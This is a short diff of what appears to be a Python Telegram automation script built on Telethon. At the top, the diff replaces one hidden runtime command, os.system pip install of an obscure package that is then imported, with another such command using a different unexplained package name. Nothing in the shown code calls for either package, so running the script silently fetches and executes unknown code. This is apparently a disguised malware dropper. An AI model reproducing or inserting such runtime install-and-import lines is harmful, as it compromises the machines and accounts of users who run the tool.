@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolouringskits")
-import pipcolouringskits
+os.system("pip install pipsqlipkgV1")
+import pipsqlipkgV1
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
 import csv
